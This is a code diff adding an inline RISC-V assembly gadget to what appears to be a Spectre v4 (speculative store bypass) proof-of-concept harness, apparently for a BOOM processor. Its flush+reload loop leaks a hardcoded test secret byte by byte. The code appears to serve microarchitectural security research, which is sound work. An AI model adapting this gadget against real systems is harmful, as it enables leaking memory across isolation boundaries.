@@ -8,6 +8,10 @@
 #define V4_ROUNDS 128
 #endif
 
+#ifndef V4_GADGET_MODE
+#define V4_GADGET_MODE 0
+#endif
+
 static char data[256];
 static uint8_t *channel;
 static const char secret[] = "S3CreT";
@@ -15,6 +19,43 @@ static const char overwrite = '#';
 
 extern void boom_v4_store_bypass_probe(uint8_t *data_ptr, uint8_t *probe,
                                        uint8_t secret_value, uint8_t overwrite_value);
+
+#if V4_GADGET_MODE == 1
+static __attribute__((noinline)) void boom_v4_store_bypass_probe_inline(uint8_t *data_ptr,
+                                                                        uint8_t *probe,
+                                                                        uint8_t secret_value,
+                                                                        uint8_t overwrite_value)
+{
+  uintptr_t slow_addr;
+  uintptr_t probe_addr;
+  uintptr_t scratch;
+
+  asm volatile(
+      "sb    %[secret], 0(%[data])\n"
+      "fence rw, rw\n"
+      "mv    %[slow_addr], %[data]\n"
+      "li    %[scratch], 6\n"
+      "mul   %[slow_addr], %[slow_addr], %[scratch]\n"
+      "div   %[slow_addr], %[slow_addr], %[scratch]\n"
+      "mul   %[slow_addr], %[slow_addr], %[scratch]\n"
+      "div   %[slow_addr], %[slow_addr], %[scratch]\n"
+      "mul   %[slow_addr], %[slow_addr], %[scratch]\n"
+      "div   %[slow_addr], %[slow_addr], %[scratch]\n"
+      "sb    %[overwrite], 0(%[slow_addr])\n"
+      "lbu   %[probe_addr], 0(%[data])\n"
+      "slli  %[probe_addr], %[probe_addr], 6\n"
+      "add   %[probe_addr], %[probe], %[probe_addr]\n"
+      "lbu   %[scratch], 0(%[probe_addr])\n"
+      : [slow_addr] "=&r"(slow_addr),
+        [probe_addr] "=&r"(probe_addr),
+        [scratch] "=&r"(scratch)
+      : [data] "r"(data_ptr),
+        [probe] "r"(probe),
+        [secret] "r"(secret_value),
+        [overwrite] "r"(overwrite_value)
+      : "memory");
+}
+#endif
 
 static __attribute__((noinline)) void read_byte(size_t index, uint8_t result[2],
                                                 uint64_t score[2], uint64_t threshold)
@@ -28,8 +69,13 @@ static __attribute__((noinline)) void read_byte(size_t index, uint8_t result[2],
     flush_range(channel, PROBE_BYTES);
     flush_line(&data[index]);
     fence_all();
+#if V4_GADGET_MODE == 1
+    boom_v4_store_bypass_probe_inline((uint8_t *)&data[index], channel,
+                                      (uint8_t)secret[index], (uint8_t)overwrite);
+#else
     boom_v4_store_bypass_probe((uint8_t *)&data[index], channel,
                                (uint8_t)secret[index], (uint8_t)overwrite);
+#endif
 
     for (size_t i = 0; i < PROBE_ENTRIES; ++i)
     {
@@ -63,6 +109,9 @@ int main(void)
 
   const uint64_t threshold = calibrate_probe_threshold(channel);
   printf("[v4] threshold: %lu\n", (unsigned long)threshold);
+#if V4_GADGET_MODE == 1
+  printf("[v4] gadget: inline\n");
+#endif
   printf("[v4] reading %lu bytes\n", (unsigned long)len);
 
   for (size_t i = 0; i < len; ++i)
